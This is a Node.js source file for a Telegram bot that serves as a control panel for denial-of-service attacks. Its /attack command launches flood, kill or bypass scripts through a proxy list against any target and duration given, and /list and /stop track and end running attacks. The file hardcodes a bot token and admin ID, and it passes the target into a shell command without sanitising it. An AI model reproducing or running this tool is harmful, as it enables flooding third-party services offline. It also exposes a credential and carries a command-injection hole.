const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { exec } = require('child_process')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const token = '7937745403:AAFWtjpfNpZ7KUUAzj1Bw7g3arSB8T-EUE0'
const adminId = '6601930239'
const bot = new TelegramBot(token, { polling: true })

let attacks = []

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj', status: 'Bot is running' })
})

app.listen(port)

bot.onText(/^\/system$/, async (msg) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
  }
  try {
    const data = await si.get({
      cpu: 'manufacturer, brand, speed, cores',
      mem: 'total, free, used',
      fsSize: 'fs, size, used, available',
      osInfo: 'platform, distro, release'
    })
    const formatBytes = (bytes) => {
      if (bytes >= 1073741824) return `${(bytes / 1073741824).toFixed(2)} GB`
      if (bytes >= 1048576) return `${(bytes / 1048576).toFixed(2)} MB`
      return `${bytes} B`
    }
    bot.sendMessage(msg.chat.id, `*CPU*: ${data.cpu.manufacturer} ${data.cpu.brand}, ${data.cpu.speed} GHz, ${data.cpu.cores} cores\n` +
      `*Memory*: Total: ${formatBytes(data.mem.total)}, Free: ${formatBytes(data.mem.free)}, Used: ${formatBytes(data.mem.used)}\n` +
      `*Disk*: ${data.fsSize.map(d => `${d.fs}: Size ${formatBytes(d.size)}, Used ${formatBytes(d.used)}, Available ${formatBytes(d.available)}`).join('\n')}\n` +
      `*OS*: ${data.osInfo.platform}, ${data.osInfo.distro}, ${data.osInfo.release}`, { parse_mode: 'Markdown' })
  } catch (error) {
    bot.sendMessage(msg.chat.id, `Error fetching system info: ${error.message}`, { parse_mode: 'Markdown' })
  }
})

bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
  }
  if (!match[1]) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]', { parse_mode: 'Markdown' })
  }
  const params = match[1].trim().split(/\s+/)
  if (params.length < 2) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]', { parse_mode: 'Markdown' })
  }
  const method = ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood'
  const target = params.length === 3 ? params[1] : params[0]
  const time = parseInt(params.length === 3 ? params[2] : params[1])
  const rate = 24
  const threads = 12
  const proxyfile = './prx.txt'
  if (!target || isNaN(time) || time <= 0) {
    return bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]', { parse_mode: 'Markdown' })
  }
  const attackId = Date.now()
  const attackData = {
    id: attackId,
    target,
    time,
    rate,
    threads,
    proxyfile,
    pid: null
  }
  try {
    attacks.push(attackData)
    const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`)
    child.on('spawn', () => {
      attackData.pid = child.pid
      bot.sendMessage(msg.chat.id, `🔴 *Attack Launched*\n\n` +
        `*Method*: ${method}\n` +
        `*Target*: ${target}\n` +
        `*Time*: ${time}s`, { parse_mode: 'Markdown' })
      bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`, { parse_mode: 'Markdown' })
    })
    child.on('error', (error) => {
      bot.sendMessage(msg.chat.id, `Child process error: ${error.message}`, { parse_mode: 'Markdown' })
      attacks = attacks.filter(a => a.id !== attackId)
    })
    child.on('exit', (code, signal) => {
      if (code === 0) {
        bot.sendMessage(msg.chat.id, `✅ Attack ${target} completed successfully`, { parse_mode: 'Markdown' })
      } else {
        bot.sendMessage(msg.chat.id, `Attack failed with code ${code || signal}`, { parse_mode: 'Markdown' })
      }
      attacks = attacks.filter(a => a.id !== attackId)
    })
  } catch (error) {
    bot.sendMessage(msg.chat.id, `Error starting attack: ${error.message}`, { parse_mode: 'Markdown' })
    attacks = attacks.filter(a => a.id !== attackId)
  }
})

bot.onText(/^\/list$/, (msg) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
  }
  if (attacks.length === 0) {
    return bot.sendMessage(msg.chat.id, 'No active attacks', { parse_mode: 'Markdown' })
  }
  const attackList = attacks.map(a => `*ID*: ${a.id}, *Target*: ${a.target}, *Time*: ${a.time}s`).join('\n')
  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`, { parse_mode: 'Markdown' })
})

bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    return bot.sendMessage(msg.chat.id, 'Access denied', { parse_mode: 'Markdown' })
  }
  if (!match[1] || isNaN(parseInt(match[1]))) {
    return bot.sendMessage(msg.chat.id, 'Usage: /stop [attack_id]', { parse_mode: 'Markdown' })
  }
  const attackId = parseInt(match[1])
  const attack = attacks.find(a => a.id === attackId)
  if (!attack) {
    return bot.sendMessage(msg.chat.id, 'Attack not found', { parse_mode: 'Markdown' })
  }
  try {
    process.kill(attack.pid, 'SIGTERM')
    attacks = attacks.filter(a => a.id !== attackId)
    bot.sendMessage(msg.chat.id, `🛑 Attack ${attackId} stopped`, { parse_mode: 'Markdown' })
  } catch (error) {
    bot.sendMessage(msg.chat.id, `Error stopping attack: ${error.message}`, { parse_mode: 'Markdown' })
    attacks = attacks.filter(a => a.id !== attackId)
  }
})
